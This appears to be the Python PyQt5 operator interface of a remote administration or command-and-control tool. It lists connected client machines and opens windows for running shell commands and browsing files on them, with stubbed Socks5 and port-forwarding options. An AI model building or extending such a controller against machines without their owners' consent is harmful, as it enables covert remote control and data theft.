import os

from PyQt5 import QtWidgets, QtCore
from PyQt5.QtWidgets import QTableWidgetItem, QMenu, QLabel, QFrame
from MainWindows import Ui_MainWindow

import sys
import _thread
from datetime import datetime
from configparser import ConfigParser
from listenserver import SocketServer
from cmdui import Ui_cmdform
from filemanagerui import Ui_FileManager


class MainUI(QtWidgets.QMainWindow):
    statusBarSignal = QtCore.pyqtSignal(str, int)
    insertRowSignal = QtCore.pyqtSignal(dict)
    deleteRowSignal = QtCore.pyqtSignal(int)

    def __init__(self):
        super(MainUI, self).__init__()
        self.Ui_MainWindow = Ui_MainWindow()
        self.Ui_MainWindow.setupUi(self)
        self.twClient = self.Ui_MainWindow.twClient

        self.twClient.setColumnWidth(0, 80)
        self.twClient.setColumnWidth(1, 150)
        self.twClient.setColumnWidth(2, 100)
        self.twClient.setColumnWidth(3, 120)
        self.twClient.setColumnWidth(4, 120)

        self.lb1 = QLabel('    ')
        self.lb1.setStyleSheet('border: 0; color:  blue;')
        self.lb2 = QLabel('    ')
        self.lb2.setStyleSheet('border: 0; color:  green;')
        self.statusBar().reformat()
        self.statusBar().setStyleSheet('border: 0; background-color: #FFF8DC;')
        self.statusBar().setStyleSheet("QStatusBar::item {border: none;}")

        self.statusBar().addPermanentWidget(VLine())
        self.statusBar().addPermanentWidget(self.lb1)
        self.statusBar().addPermanentWidget(VLine())
        self.statusBar().addPermanentWidget(self.lb2)

        self.rowCount = 0
        self.cmdUi = list()
        self.cmdId = 0
        self.fileManagerUi = list()
        self.fileManagerId = 0
        self.setRowDataCenter()

        self.listenSocket = None

        # Signal
        self.twClient.customContextMenuRequested.connect(self.contextMenuEvent)
        self.statusBarSignal.connect(self.statusBarPrint)
        self.insertRowSignal.connect(self.insertRow)
        self.deleteRowSignal.connect(self.deleteRow)

    def statusBarPrint(self, string, id):
        if id == 3:
            self.lb2.setText(string)
        if id == 2:
            self.lb1.setText('just test')
        if id == 1:
            self.statusBar().showMessage(string)

    def contextMenuEvent(self, pos):
        try:
            menu = QMenu()
            Start = menu.addAction("Start")
            Stop = menu.addAction("Stop")
            CommandLine = menu.addAction("CommandLine")
            FileManager = menu.addAction("FileManager")
            Sockes5 = menu.addAction("Sockes5")
            PortForward = menu.addAction("PortForward")

            # print(self.twClient.selectedItems())
            action = menu.exec_(self.mapToGlobal(pos))
            if action == Start and not self.listenSocket:
                cfg = ConfigParser()
                cfg.read('config.ini')
                listenIp = cfg.get(cfg.sections()[0], 'ListenIp')
                listenPort = cfg.get(cfg.sections()[0], 'ListenPort')

                if listenIp and listenPort:
                    self.listenSocket = SocketServer(listenIp=listenIp, listenPort=int(listenPort),
                                                     statusBarSignal=self.statusBarSignal,
                                                     insertRowSignal=self.insertRowSignal,
                                                     deleteRowSignal=self.deleteRowSignal)
                    _thread.start_new_thread(self.listenSocket.listenServer, ())

            if action == Stop and self.listenSocket:
                print('stop...')

            if action == CommandLine:
                if self.twClient.selectedItems():
                    currentRow = self.twClient.currentRow()
                    clientId = self.twClient.item(currentRow, 0).text()
                    clientComputerName = self.twClient.item(currentRow, 1).text()
                    # open cmd ui
                    cmdui = CmdUi(self.cmdId, self.listenSocket, clientComputerName)
                    self.cmdUi.append(cmdui)
                    cmdui.show()
                    # send cmd to client
                    _thread.start_new_thread(self.listenSocket.sendCmd, (clientId, self.cmdId,))
                    self.cmdId += 1

            if action == FileManager:
                if self.twClient.selectedItems():
                    currentRow = self.twClient.currentRow()
                    clientId = self.twClient.item(currentRow, 0).text()
                    clientComputerName = self.twClient.item(currentRow, 1).text()
                    fileManagerUi = FileManagerUi(self.fileManagerId, self.listenSocket, clientComputerName)
                    self.fileManagerUi.append(fileManagerUi)
                    fileManagerUi.show()
                    # send cmd to client
                    _thread.start_new_thread(self.listenSocket.sendFileManager, (clientId, self.fileManagerId,))
                    self.fileManagerId += 1

            if action == Sockes5:
                print('Sockes5')

            if action == PortForward:
                print('PortForward')

        except Exception as e:
            print(e)

    def setRowDataCenter(self):
        delegate = AlignDelegate(self.twClient)
        self.twClient.setItemDelegateForColumn(0, delegate)
        self.twClient.setItemDelegateForColumn(1, delegate)
        self.twClient.setItemDelegateForColumn(2, delegate)
        self.twClient.setItemDelegateForColumn(3, delegate)
        self.twClient.setItemDelegateForColumn(4, delegate)
        self.twClient.setItemDelegateForColumn(5, delegate)

    def insertRow(self, rowData):
        self.rowCount += 1
        self.twClient.setRowCount(self.rowCount)
        self.twClient.setItem(self.rowCount - 1, 0, QTableWidgetItem(str(rowData['id'])))
        self.twClient.setItem(self.rowCount - 1, 1, QTableWidgetItem(rowData['computerName']))
        self.twClient.setItem(self.rowCount - 1, 2, QTableWidgetItem(rowData['UserName']))
        self.twClient.setItem(self.rowCount - 1, 3, QTableWidgetItem(rowData['Lan']))
        self.twClient.setItem(self.rowCount - 1, 4, QTableWidgetItem(rowData['Wan']))
        self.twClient.setItem(self.rowCount - 1, 5, QTableWidgetItem(rowData['OS']))

    def deleteRow(self, rowId):
        for index in range(self.twClient.rowCount()):
            _id = int(self.twClient.item(index, 0).text())
            if _id == rowId:
                self.twClient.removeRow(index)
                self.rowCount -= 1
                break


class FileManagerUi(QtWidgets.QMainWindow):
    dirResultSignal = QtCore.pyqtSignal(str)

    def __init__(self, fileManagerId, listenSocket, clientComputerName):
        super(FileManagerUi, self).__init__()
        self.Ui_FileManager = Ui_FileManager()
        self.Ui_FileManager.setupUi(self)

        self.fileManagerId = fileManagerId
        self.listenSocket = listenSocket
        self.clientComputerName = clientComputerName

        title = f'\\\\{clientComputerName}  id:{self.fileManagerId}'
        self.setWindowTitle(title)
        self.Ui_FileManager.leInputPath.returnPressed.connect(self.sendPath)

        # Signal
        self.dirResultSignal.connect(self.pathResult)

        self.Ui_FileManager.twList.setColumnWidth(0, 150)
        self.Ui_FileManager.twList.setColumnWidth(1, 150)
        self.Ui_FileManager.twList.setColumnWidth(2, 100)
        self.Ui_FileManager.twList.setColumnWidth(3, 50)
        self.Ui_FileManager.twList.doubleClicked.connect(self.clickPath)

        self.Ui_FileManager.twList.customContextMenuRequested.connect(self.contextMenuEvent)

    def contextMenuEvent(self, pos):
        try:
            menu = QMenu()
            upload = menu.addAction("upload")
            downloads = menu.addAction("downloads")
            action = menu.exec_(self.mapToGlobal(pos))
            if action == upload:
                print('upload')
            if action == downloads:
                print('downloads')
        except Exception as e:
            print(e)

    def clickPath(self):
        if self.Ui_FileManager.twList.selectedItems():
            if self.Ui_FileManager.twList.selectedItems()[2].text() == 'File Directory':
                self.setDisabled(True)
                path = os.path.join(self.Ui_FileManager.leInputPath.text(),
                                    self.Ui_FileManager.twList.selectedItems()[0].text())
                _thread.start_new_thread(self.listenSocket.sendPath,
                                         (self.fileManagerId, path, self.dirResultSignal,))
                self.Ui_FileManager.leInputPath.setText(path)

    def sendPath(self):
        self.setDisabled(True)
        path = self.Ui_FileManager.leInputPath.text()
        _thread.start_new_thread(self.listenSocket.sendPath,
                                 (self.fileManagerId, path, self.dirResultSignal,))

    def pathResult(self, result):
        self.setEnabled(True)
        rowCount = 1

        if 'WinError' in result:
            self.statusBar().showMessage(result)
            return

        for line in result.split('\n'):
            if line:
                self.Ui_FileManager.twList.setRowCount(rowCount)
                name = line.split('/')[0]
                date = datetime.fromtimestamp(float(line.split('/')[1])).strftime('%Y-%m-%d %H:%M:%S')
                type = line.split('/')[2]
                size = line.split('/')[3]
                self.Ui_FileManager.twList.setItem(rowCount - 1, 0, QTableWidgetItem(name))
                self.Ui_FileManager.twList.setItem(rowCount - 1, 1, QTableWidgetItem(date))
                self.Ui_FileManager.twList.setItem(rowCount - 1, 2, QTableWidgetItem(type))
                self.Ui_FileManager.twList.setItem(rowCount - 1, 3, QTableWidgetItem(size))
                rowCount += 1


class CmdUi(QtWidgets.QWidget):
    commandResultSignal = QtCore.pyqtSignal(str)

    def __init__(self, cmdId, listenSocket, clientComputerName):
        super(CmdUi, self).__init__()
        self.Ui_cmdForm = Ui_cmdform()
        self.Ui_cmdForm.setupUi(self)

        self.cmdId = cmdId
        self.listenSocket = listenSocket

        title = f'\\\\{clientComputerName}  id:{self.cmdId}'
        self.setWindowTitle(title)
        self.Ui_cmdForm.tbOutput.setText('Command >')
        self.Ui_cmdForm.pbSend.clicked.connect(self.sendCommand)
        self.Ui_cmdForm.qlInput.returnPressed.connect(self.Ui_cmdForm.pbSend.click)

        # Signal
        self.commandResultSignal.connect(self.tbOutput)

    def sendCommand(self):
        command = self.Ui_cmdForm.qlInput.text()
        self.tbOutput(f'Command >{command}')
        self.Ui_cmdForm.qlInput.setText('')
        # self.listenSocket.sendCommand(self.cmdId, command.encode('gbk'), self.commandResultSignal)
        _thread.start_new_thread(self.listenSocket.sendCommand,
                                 (self.cmdId, command, self.commandResultSignal,))

    def tbOutput(self, string):
        if string:
            self.Ui_cmdForm.tbOutput.append(string)

    def closeEvent(self, event):
        self.listenSocket.closeCmdSocket(self.cmdId)


class AlignDelegate(QtWidgets.QStyledItemDelegate):
    def initStyleOption(self, option, index):
        super(AlignDelegate, self).initStyleOption(option, index)
        option.displayAlignment = QtCore.Qt.AlignCenter


class VLine(QFrame):
    # a simple VLine, like the one you get from designer
    def __init__(self):
        super(VLine, self).__init__()
        self.setFrameShape(self.VLine | self.Sunken)


def main():
    app = QtWidgets.QApplication(sys.argv)
    application = MainUI()
    application.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
